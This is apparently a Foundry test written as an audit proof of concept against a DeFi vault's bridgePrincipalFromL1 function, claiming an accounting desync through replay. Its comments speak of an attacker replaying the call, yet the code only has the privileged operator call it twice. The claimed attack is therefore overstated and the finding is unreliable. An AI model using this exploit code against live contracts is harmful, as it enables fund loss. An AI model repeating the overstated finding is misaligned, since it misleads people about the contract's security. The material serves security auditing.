// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixVault.sol";
import "../src/interfaces/HyperCoreConstants.sol";

contract MockCoreWriter {}

contract AuditAgentPoC is Test, ToL1WeiHarness {
    // ATTACK TIMELINE:
    // 1. [Setup] Harness deploys contracts and mocks L1 precompile balances.
    // 2. [T=0] User deposits 100k USDC and stakes. Operator bridges to L1, setting outstandingL1Principal = 100k.
    // 3. [T=1] Operator calls bridgePrincipalFromL1(50k). L2 accounting decrements outstandingL1Principal to 50k.
    // 4. [T=2] Attacker replays the identical bridge action (no nonce/deadline/chainId protection). L2 accounting decrements outstandingL1Principal to 0.
    // 5. [Assert] Verify outstandingL1Principal is 0 while vault USDC balance remains 0, proving the accounting desync.

    function test_exploit() public {
        // 1. Setup & Mock L1 Precompile
        vm.etch(HyperCoreConstants.CORE_WRITER, address(new MockCoreWriter()).code);
        _mockVaultL1SpotUsdc(type(uint64).max);

        // 2. Deposit, Stake, and Bridge to L1
        _depositAs(user1, 100_000e6);
        _stakeAs(user1, 1_000e6);
        vm.warp(block.timestamp + 6 hours);

        vm.prank(operator);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault);

        uint256 olpBefore = vault.outstandingL1Principal();
        console.log("Step 2: outstandingL1Principal after keeperBridge =", olpBefore);
        assertEq(olpBefore, 100_000e6, "OLP should be 100k after bridge");

        // 3. First Bridge Principal from L1
        vm.prank(operator);
        vault.bridgePrincipalFromL1(50_000e6);

        uint256 olpAfterFirst = vault.outstandingL1Principal();
        console.log("Step 3: outstandingL1Principal after first bridgePrincipal =", olpAfterFirst);
        assertEq(olpAfterFirst, 50_000e6, "OLP should drop to 50k");

        // 4. Replay Attack: Second Bridge Principal from L1 (No nonce protection)
        vm.prank(operator);
        vault.bridgePrincipalFromL1(50_000e6);

        uint256 olpAfterReplay = vault.outstandingL1Principal();
        uint256 vaultUsdcBalance = usdc.balanceOf(address(vault));

        console.log("Step 4: outstandingL1Principal after replay =", olpAfterReplay);
        console.log("Step 4: vault USDC balance (actual funds) =", vaultUsdcBalance);

        // 5. Assert Accounting Desync
        // The L2 accounting believes 100k principal has returned, but 0 USDC actually arrived.
        assertEq(olpAfterReplay, 0, "OLP incorrectly decremented to 0 via replay");
        assertEq(vaultUsdcBalance, 0, "Vault holds no actual USDC, proving desync");
    }
}
